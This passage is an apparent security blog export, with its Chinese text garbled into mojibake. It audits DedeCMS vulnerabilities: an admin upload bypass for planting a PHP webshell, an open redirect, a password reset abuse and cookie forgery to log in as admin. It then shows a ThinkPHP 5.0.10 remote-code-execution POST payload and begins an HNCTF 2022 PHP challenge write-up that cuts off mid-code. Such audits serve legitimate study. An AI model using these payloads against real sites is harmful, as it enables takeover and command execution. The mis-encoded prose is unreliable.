href="#æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹"></a>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</h2><h3 id="dede-archives-do-php"><a href="#dede-archives-do-php" class="headerlink" title=" /dede/archives_do.php"></a><code> /dede/archives_do.php</code></h3><p><img src="/../images/image-20230525201745708-1686141975687.png" alt="image-20230525201745708"></p><p><img src="/../images/image-20230525200159854-1686141975687.png" alt="image-20230525200159854"></p><p>å®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>upload.helper.php</code>ä¸­çš„<code>AdminUpload</code>æ–¹æ³•</p><p><img src="/../images/image-20230525201545164-1686141975687.png" alt="image-20230525201545164"></p><p><img src="/../images/image-20230525201700590-1686141975687.png" alt="image-20230525201700590"></p><p>å¯ä»¥çœ‹åˆ°åªå¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†æ ¡éªŒ,æ²¡æœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œæ ¡éªŒ</p><p>å†çœ‹ä¸€ä¸‹å…¨å±€é˜²æŠ¤<code>uploadsafe.inc.php</code></p><p><img src="/../images/image-20230525201856657-1686141975688.png" alt="image-20230525201856657"></p><p><img src="/../images/image-20230525201949967-1686141975688.png" alt="image-20230525201949967"></p><p>è™½ç„¶æœ‰é»‘åå•ï¼Œä½†æ˜¯é»‘åå•å¯¹ç®¡ç†å‘˜ç”¨æˆ·æ— æ•ˆ</p><p><img src="/../images/image-20230525202104709-1686141975688.png" alt="image-20230525202104709"></p><p>æœ€åç”¨<code>getimagesize</code>è¿›è¡Œæ ¡éªŒï¼Œå¯ä»¥æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡ã€‚</p><p>ç»¼ä¸Šæ‰€å±ï¼Œæ˜¯ç®¡ç†å‘˜èº«ä»½ï¼Œåªéœ€è¦ä¿®æ”¹MIMEå’Œæ–‡ä»¶å¤´å³å¯ç»•è¿‡è¿‡æ»¤ã€‚</p><p><img src="/../images/image-20230525191610086-1686141975688.png" alt="image-20230525191610086"></p><p><img src="/../images/image-20230525191553945-1686141975688.png" alt="image-20230525191553945"></p><h3 id="dede-media-add-php"><a href="#dede-media-add-php" class="headerlink" title="/dede/media_add.php"></a><code>/dede/media_add.php</code></h3><p><img src="/../images/image-20230525205532459-1686141975688.png" alt="image-20230525205532459"></p><p>è·Ÿä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œåªæ ¡éªŒMIMEï¼Œä¸æ ¡éªŒåç¼€ï¼Œåªæ˜¯å¤šäº†ä¸€æ­¥åŠ æ°´å°çš„ï¼Œæ‰€ä»¥ä¼ ä¸€ä¸ªphpåç¼€çš„å›¾ç‰‡é©¬</p><p><img src="/../images/image-20230525205858924-1686141975688.png" alt="image-20230525205858924"></p><h3 id="dede-file-manage-control-php"><a href="#dede-file-manage-control-php" class="headerlink" title="/dede/file_manage_control.php"></a><code>/dede/file_manage_control.php</code></h3><p><img src="/../images/image-20230525204329712-1686141975689.png" alt="image-20230525204329712"></p><p><img src="/../images/image-20230525210840452-1686141975688.png" alt="image-20230525210840452"></p><p><img src="/../images/image-20230525211553932-1686141975689.png" alt="image-20230525211553932"></p><p>æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥å†™ğŸ</p><h2 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h2><p><code>plus/download.php</code></p><p><img src="/../images/image-20230526100708534-1686141975688.png" alt="image-20230526100708534"></p><p><img src="/../images/image-20230526100724469-1686141975689.png" alt="image-20230526100724469"></p><p><img src="/../images/image-20230526101319599-1686141975690.png" alt="image-20230526101319599"></p><p><code>$linkinfo</code>å‹æ ¹ä¸å­˜åœ¨ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¯¹urlå…ˆè¿›è¡Œbase64åŠ å¯†ï¼Œå†è¿›è¡ŒurlåŠ å¯†å³å¯</p><p><img src="/../images/image-20230526101138188-1686141975689.png" alt="image-20230526101138188"></p><h2 id="ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹"><a href="#ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹" class="headerlink" title="ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹"></a>ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹</h2><p>å…ˆçœ‹ä¸€ä¸‹ä¼šå‘˜ä¸­å¿ƒçš„é€»è¾‘</p><p><code>member/index.php</code></p><p>æ ¡éªŒç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œç™»å½•åˆ™è¿›å…¥ä¼šå‘˜ä¸ªäººä¸­å¿ƒ</p><p><code>member/index_do.php</code></p><p>ä¼šå‘˜æ“ä½œä¸<code>$fmdo</code>å‚æ•°åŒ¹é…</p><p>é‡ç½®å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index_do.php?fmdo=user&amp;dopost=xxx</span><br></pre></td></tr></table></figure><p>é‡ç½®å¯†ç é€»è¾‘åœ¨<code>resetpassword.php</code>ä¸­,å¤§è‡´é€»è¾‘å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// æ‰¾å›å¯†ç ç¬¬ä¸€æ­¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å¯†ç é—®é¢˜åˆ¤æ–­</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// æ‰¾å›å¯†ç ç¬¬äºŒæ­¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨å¯†ç é—®é¢˜åˆ¤æ–­</p><p><img src="/../images/image-20230526123219865-1686141975689.png" alt="image-20230526123219865"></p><p>ä½¿ç”¨äº†å¼±æ¯”è¾ƒï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰è®¾ç½®å¯†ç é—®é¢˜ï¼Œé»˜è®¤å€¼å¦‚ä¸‹</p><p><img src="/../images/image-20230526123041472-1686141975689.png" alt="image-20230526123041472"></p><p>æ‰€ä»¥å¯ä»¥æ„é€ <code>safequestion=0.0&amp;safeanswer=</code>æ¥è¿›å…¥è¯¥ifè¯­å¥</p><p>è·Ÿè¿› snï¼Œæœ€ç»ˆæ˜¯é‡å®šå‘åˆ°ä¿®æ”¹å¯†ç é¡µé¢</p><p><img src="/../images/image-20230526123510601-1686141975689.png" alt="image-20230526123510601"></p><h2 id="ä»»æ„ç”¨æˆ·ç™»å½•"><a href="#ä»»æ„ç”¨æˆ·ç™»å½•" class="headerlink" title="ä»»æ„ç”¨æˆ·ç™»å½•"></a>ä»»æ„ç”¨æˆ·ç™»å½•</h2><p>çœ‹ä¸€ä¸‹æ€ä¹ˆå¤„ç†çš„</p><p><code>member/config.php</code></p><p><img src="/../images/image-20230526130641724-1686141975689.png" alt="image-20230526130641724"></p><p>è·Ÿè¿›</p><p><img src="/../images/image-20230526130848007-1686141975689.png" alt="image-20230526130848007"></p><p><img src="/../images/image-20230526132740089-1686141975689.png" alt="image-20230526132740089"></p><p>å¯¹å¾—åˆ°çš„<code>M_ID</code>åšäº†<code>intval</code>å¤„ç†ï¼Œæœ€åæ ¹æ®<code>M_ID</code>çš„å€¼ä»æ•°æ®åº“ä¸­å–å‡ºå¯¹åº”ç”¨æˆ·</p><p>è·Ÿè¿›<code>getnum</code></p><p><img src="/../images/image-20230526132102568-1686141975689.png" alt="image-20230526132102568"></p><p>è·Ÿè¿›<code>getcookie</code></p><p><img src="/../images/image-20230526131125230-1686141975689.png" alt="image-20230526131125230"></p><p>ä¸¤ä¸ªIFï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­Cookieä¸­çš„DedeUserIDå’ŒDedeUserID__ckMD5,å¦‚æœéƒ½å­˜åœ¨è¿›å…¥ç¬¬äºŒä¸ªifï¼Œæ ¡éªŒcookieæœ‰æ•ˆæ€§ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡åŠ ç›å†åŠ å¯†çš„æ–¹å¼ï¼Œæ‰€ä»¥æŒ‰ç†è¯´æ˜¯æ— æ³•ä¼ªé€ cookieçš„ã€‚</p><p>ä½†æ˜¯å¯ä»¥ä»<code>/member/index.php</code>å¯ä»¥æ¥è·å–è¿™ä¸ªåŠ å¯†åçš„å€¼</p><p>æœç´¢<code>getcookie</code>å¾—åˆ°</p><p><img src="/../images/image-20230526131657609-1686141975689.png" alt="image-20230526131657609"></p><p>è·Ÿè¸ª<code>$last_vid</code></p><p><img src="/../images/image-20230526132259147-1686141975690.png" alt="image-20230526132259147"></p><p>å¦‚æœ<code>$last_vid</code>ä¸ºç©ºï¼Œé‚£ä¹ˆå°†<code>$uid</code>èµ‹å€¼ç»™<code>$last_vid</code>ï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™<code>PutCookie</code>å‡½æ•°</p><p>è·Ÿè¿›<code>PutCookie</code>å‡½æ•°</p><p><img src="/../images/image-20230526132158862-1686141975690.png" alt="image-20230526132158862"></p><p>å¯ä»¥çœ‹åˆ°è·Ÿç™»å½•çš„<code>getcookie</code>åŠ å¯†æ–¹å¼ä¸€æ ·ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>ç™»å½•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·çš„èº«ä»½ç”±DedeUserIDçš„å€¼æ¥å†³å®š</span><br><span class="line"></span><br><span class="line">æ ¡éªŒï¼šDedeUserID__ckMd5çš„å€¼å’Œ<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.DedeUserID)</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>member/index.php?uid=xx</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">last_vid=uid</span><br><span class="line"></span><br><span class="line">last_vid__ckMd5=<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.uid)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è®©</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥ç»•è¿‡getcookieçš„æ ¡éªŒï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯<code>uid</code>æŒ‡çš„æ˜¯ç”¨æˆ·çš„<code>userid</code>ï¼Œ<code>DedeUserID</code>æŒ‡çš„æ˜¯ç”¨æˆ·çš„<code>mid</code>ï¼Œæ‰€ä»¥è¦è®©<code>uid</code>ä¸º<code>mid</code>æ‰å¯ä»¥ä¼ªé€ èº«ä»½</p><p><img src="/../images/image-20230526134001725-1686141975691.png" alt="image-20230526134001725"></p><p>è¿˜è®°å¾—ä¸Šé¢çš„å¤„ç†å—ï¼Ÿ</p><p><img src="/../images/image-20230526134147020-1686141975690.png" alt="image-20230526134147020"></p><p>æ‰€ä»¥åªéœ€è¦æ„é€ ä¸€ä¸ªå«æœ‰æ•°å­—1çš„å­—ç¬¦ä¸²å°±å¯ä»¥ä¼ªé€ adminçš„èº«ä»½ã€‚</p><p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º1adminçš„ç”¨æˆ·</p><p><img src="/../images/image-20230526125711799-1686141975690.png" alt="image-20230526125711799"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230526125702071-1686141975690.png" alt="image-20230526125702071"></p><h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer create<span class="literal">-project</span> <span class="literal">--prefer-dist</span> topthink/think=<span class="number">5.0</span>.<span class="number">10</span> tp5.<span class="number">0.10</span></span><br></pre></td></tr></table></figure><p>å°† <a href="https://so.csdn.net/so/search?q=composer&spm=1001.2101.3001.7020">composer</a>.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ–°</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>å°†å…¶æ”¾ç½®åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œè®¿é—®<a href="http://127.0.0.1/tp5.0.10/public/">http://127.0.0.1/tp5.0.10/public/</a></p><p><img src="/../images/image-20230529155309821-1686141975690.png" alt="image-20230529155309821"></p><h2 id="æ¦‚è§ˆ"><a href="#æ¦‚è§ˆ" class="headerlink" title="æ¦‚è§ˆ"></a>æ¦‚è§ˆ</h2><p>æ¨èé˜…è¯»<a href="https://www.cnblogs.com/yokan/p/16102644.html">https://www.cnblogs.com/yokan/p/16102644.html</a></p><h3 id="è·¯ç”±å’Œå‚æ•°ä¼ é€’"><a href="#è·¯ç”±å’Œå‚æ•°ä¼ é€’" class="headerlink" title="è·¯ç”±å’Œå‚æ•°ä¼ é€’"></a>è·¯ç”±å’Œå‚æ•°ä¼ é€’</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//servername/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...] # pathinfoæ¨¡å¼</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//servername/index.php?s=/index/Index/index    # å…¼å®¹æ–¹å¼</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=<span class="number">213</span></span><br><span class="line">/name/<span class="number">123</span></span><br></pre></td></tr></table></figure><p>å¦‚æ§åˆ¶å™¨Indexï¼š<code>application/index/controller/Index.php</code></p><p><img src="/../images/image-20230531232416306.png" alt="image-20230531232416306"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&amp;name=world</span></span><br></pre></td></tr></table></figure><h2 id="Requestç±»ä»»æ„è°ƒç”¨-constructæ–¹æ³•å¯¼è‡´çš„rce"><a href="#Requestç±»ä»»æ„è°ƒç”¨-constructæ–¹æ³•å¯¼è‡´çš„rce" class="headerlink" title="Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce"></a>Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Requestæ ¸å¿ƒç±»**$method** æ¥è‡ªå¯æ§çš„ <strong>$_POST</strong> æ•°ç»„ï¼Œè€Œä¸”åœ¨è·å–ä¹‹åæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥æŠŠå®ƒä½œä¸º <strong>Request</strong> ç±»çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼ŒåŒæ—¶ï¼Œè¯¥æ–¹æ³•ä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§æ•°æ® <strong>$_POST</strong> ã€‚å¯¼è‡´å¯ä»¥éšæ„è°ƒç”¨ <strong>Request</strong> ç±»çš„éƒ¨åˆ†æ–¹æ³•</p><blockquote><p><strong>è¿‡ç¨‹ï¼š</strong></p><p>è®©methodç­‰äº <code>__construct</code>é­”æœ¯æ–¹æ³•ï¼Œç„¶åé‡Œé¢çš„ <code>foreach</code>å‡½æ•°é€ æˆå˜é‡è¦†ç›–ã€‚ç„¶åé€šè¿‡<strong>Request</strong> ç±»ä¸­çš„ <code>param</code>æ–¹æ³•æœ€ç»ˆåˆè°ƒç”¨äº†<code>filterValue</code>æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ <strong>call_user_func</strong> å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</p></blockquote><blockquote><p><strong>Request</strong> ç±»ä¸­çš„ <code>paramã€routeã€getã€postã€putã€deleteã€patchã€requestã€sessionã€serverã€envã€cookieã€input</code> æ–¹æ³•å‡è°ƒç”¨äº† <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ <strong>call_user_func</strong> å‡½æ•°</p></blockquote><p>ä»¥5.0.10ç‰ˆæœ¬ä¸ºä¾‹</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/tp5.0.10/public/index.php</span><br><span class="line"></span><br><span class="line"># post</span><br><span class="line">_method=__construct&amp;filter=system&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531225820851.png" alt="image-20230531225820851"></p><h3 id="è°ƒè¯•-1"><a href="#è°ƒè¯•-1" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>ç¬¬ä¸€ä¸ªæ–­ç‚¹ä¸‹åœ¨<code>thinkphp/libary/think/App.php</code>æ–‡ä»¶ï¼Œè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æè¿™é‡Œ</p><p><img src="/../images/image-20230531221156861.png" alt="image-20230531221156861"></p><p>è·Ÿè¿›<code>routeCheck</code></p><p><img src="/../images/image-20230531221218359.png" alt="image-20230531221218359"></p><p>è·Ÿè¿›<code>check</code></p><p><img src="/../images/image-20230531221233596.png" alt="image-20230531221233596"></p><p>è·Ÿè¿›<code>method</code></p><p><img src="/../images/image-20230531221259178.png" alt="image-20230531221259178"></p><p><code>var_method</code>åœ¨<code>application/config.php</code>ä¸­</p><p><img src="/../images/image-20230531222320838.png" alt="image-20230531222320838"></p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥æ§åˆ¶<code>method</code>å˜é‡ï¼Œä»è€Œä»»æ„è°ƒç”¨Requestç±»çš„æ–¹æ³•ã€‚</p><p>å¦‚æœè°ƒç”¨<code>__construct</code>æ–¹æ³•</p><p><img src="/../images/image-20230531221707200.png" alt="image-20230531221707200"></p><p>å­˜åœ¨ä¸€ä¸ª<code>foreach</code>å¾ªç¯ï¼Œå¦‚æœä¼ å…¥çš„<code>options</code>æ•°ç»„çš„é”®åä¸ºè¯¥ç±»çš„å±æ€§ï¼Œå°±ç”¨é”®å€¼è¦†ç›–è¯¥å±æ€§çš„å€¼ã€‚</p><p><img src="/../images/image-20230531222852250.png" alt="image-20230531222852250"></p><p>ç»§ç»­å¾€ä¸‹</p><p>åœ¨<code>App::run()</code>æ–¹æ³•é‡Œé¢ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯äº†debugæ¨¡å¼ï¼Œåˆ™ä¼šè°ƒç”¨<code>Request::param()</code>æ–¹æ³•ï¼š</p><p><img src="/../images/image-20230531223011915.png" alt="image-20230531223011915"></p><p>å°±ç®—æ²¡æœ‰å¼€å¯debugæ¨¡å¼ï¼Œä¸‹é¢çš„execæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨</p><p><img src="/../images/image-20230531230604547.png" alt="image-20230531230604547"></p><p><img src="/../images/image-20230531220640414.png" alt="image-20230531220640414"></p><p>è·Ÿè¿›<code>Request::param()</code>æ–¹æ³•</p><p>å°†è·å–åˆ°çš„postå‚æ•°ç”¨<code>array_merge</code>ä¸getæ–¹å¼çš„å‚æ•°è¿›è¡Œåˆå¹¶</p><p><img src="/../images/image-20230531225110758.png" alt="image-20230531225110758"></p><p>æœ€åå°†å…¶ä¼ å…¥<code>input</code>ä¸­</p><p><img src="/../images/image-20230531224212939.png" alt="image-20230531224212939"></p><p>è·Ÿè¿›<code>Request::input()</code>,<code>array_walk_recursive</code>  å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªæˆå‘˜é€’å½’åœ°åº”ç”¨ç”¨æˆ·å‡½æ•°</p><p><img src="/../images/image-20230531224435122.png" alt="image-20230531224435122"></p><p>ç„¶å<code>filterValue</code>æ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†<code>call_user_func</code>é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/image-20230531223158698.png" alt="image-20230531223158698"></p><h3 id="å…³é”®ç‚¹æ€»ç»“"><a href="#å…³é”®ç‚¹æ€»ç»“" class="headerlink" title="å…³é”®ç‚¹æ€»ç»“"></a>å…³é”®ç‚¹æ€»ç»“</h3><p>Fromï¼šä¸ƒæœˆç«å¸ˆå‚…çš„ä¸€å¼ æµç¨‹å›¾</p><p><img src="/../images/1964477-20220405155310200-1040131440.png" alt="img"></p><h3 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h3><p>æµç¨‹å¤§åŒå°å¼‚</p><p>payloadæ€»ç»“ï¼š<a href="https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce">https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022</title>
      <link href="/2023/05/31/HNCTF/"/>
      <url>/2023/05/31/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$getUserID</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line"><span class="variable">$getpass</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmySaid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;mySaid&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmyHeart</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;myHeart&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$verify</span> =@<span class="variable">$_POST</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line"><span class="variable">$want</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;want&#x27;</span>];</span><br><span class="line"><span class="variable">$final</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;final&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$getUserID</span>))</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$user</span> + <span class="variable">$getUserID</span>; <span class="comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$getpass</span> == <span class="variable">$pass</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$getmySaid</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$getmyHeart</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$getmySaid</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$getmyHeart</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cheater!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$week_1</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å­—ç¬¦ä¸²ä¸æ•°å­—å¼±æ¯”è¾ƒ</p><blockquote><p>u5er_D0_n0t_b3g1n_with_4_numb3r</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;sdasd114514&#x27;</span> ==  <span class="number">114514</span></span><br><span class="line">    </span><br><span class="line">get --&gt; user=<span class="number">114514</span></span><br></pre></td></tr></table></figure></li><li><p>çŒœæµ‹$passä¸ºå­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;dbasdha&#x27;</span> == <span class="number">0</span> <span class="comment">//True</span></span><br><span class="line"></span><br><span class="line">get --&gt; pass=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>å­—ç¬¦ä¸²ä¸æ•°å­—MD5ç›¸ç­‰</p><p>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡  <strong>0eå¼€å¤´çš„æ•°å­—å­—ç¬¦ä¸²</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s214587387a</span><br><span class="line">   </span><br><span class="line"><span class="number">1586264293</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]===<span class="string">&quot;Probius&quot;</span>) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;Probius&quot;</span>,<span class="variable">$data</span>)===<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$week_2</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array_searché»˜è®¤å¼±æ¯”è¾ƒæŸ¥æ‰¾,è¿”å›æŸ¥æ‰¾æˆåŠŸå…ƒç´ çš„ä¸‹æ ‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$week_1</span> &amp;&amp; <span class="variable">$week_2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$verify</span>))</span><br><span class="line">        <span class="comment">// â€®â¦HNCTFâ©â¦Welcome to</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hn&quot;</span> == <span 